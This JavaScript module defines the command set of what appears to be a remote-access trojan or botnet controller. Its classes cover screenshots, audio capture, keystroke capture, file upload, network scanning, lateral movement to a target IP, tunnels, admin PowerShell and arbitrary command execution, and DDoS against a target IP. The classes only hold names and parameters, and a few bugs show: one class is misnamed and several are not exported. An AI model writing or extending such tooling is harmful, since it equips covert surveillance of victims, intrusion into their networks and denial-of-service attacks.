
class Command {

    constructor(name) {
        this.name = name
    }
}



class Idle extends Command {
    constructor(props) {
        super(props);
        this.name = "Idle"
    }
}

class Ping extends Command {
    constructor(props) {
        super(props);
        this.name = "Ping"
        this.targetIp = props.targetIp
    }
}

class Announce extends Command {
    constructor(props) {
        super(props);
        this.name = "Announce"
    }
}

class Screenshot extends Command {
    constructor(props) {
        super(props);
        this.name = "Screenshot"
    }
}

class GetSysInfo extends Command {
    constructor(props) {
        super(props);
        this.name = "GetSysInfo"
    }
}

class UploadFile extends Command {
    constructor(props) {
        super(props);
        this.name = "UploadFile"
        this.path = props.path
    }
}

class GetPublicIp extends Command {
    constructor(props) {
        super(props);
        this.name = "GetPublicIp"
    }
}

class GetPrivateIp extends Command {
    constructor(props) {
        super(props);
        this.name = "GetPrivateIp"
    }
}

class AudioCapture extends Command {
    constructor(props) {
        super(props);
        this.name = "AudioCapture"
        this.length = props.length
        this.path = props.path
    }
}

 class InstallTunnel extends Command {
    constructor(props) {
        super(props);
        this.name = "InstallTunnel"

    }
}

 class OpenTunnel extends Command {
     constructor(props) {
         super(props);
         this.name = "OpenTunnel"
     }
 }

 class GetKeyboardData extends Command {
     constructor(props) {
         super(props);
         this.name = "GetKeyboardData"
     }
 }

 class NetworkMove extends Command {
     constructor(props) {
         super(props);
         this.name = "NetworkMove"
         this.targetIp = props.targetIp
     }
 }

 class InstallPython extends Command {
    constructor(props) {
        super(props)
        this.name = "InstallPython"
    }
 }

 class RunCommand extends Command {
     constructor(props) {
         super(props)
         this.name = "RunCommand"
         this.command = props.command
     }
 }

 class PowershellAdmin extends Command {
     constructor(props) {
         super(props)
         this.name = "RunCommand"
         this.command = props.command
     }
 }

 class NetworkScan extends Command {
     constructor(props) {
         super(props)
         this.name = "NetworkScan"
     }
 }
 class Ddos extends Command {
        constructor(props) {
            super(props)
            this.name = "Ddos"
            this.targetIp = props.targetIp
        }
 }
 class WifiList extends Command {
        constructor(props) {
            super(props)
            this.name = "WifiList"
        }
 }
 class SetPullingRate extends Command {
        constructor(props) {
            super(props)
            this.name = "SetPullingRate"
            this.rate = props.rate
        }
 }
 class Gateway extends Command {
        constructor(props) {
            super(props)
            this.name = "Gateway"
        }
 }


module.exports = {Command, RunCommand, NetworkScan, PowershellAdmin, NetworkMove, GetKeyboardData, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture, InstallTunnel, OpenTunnel, InstallPython }
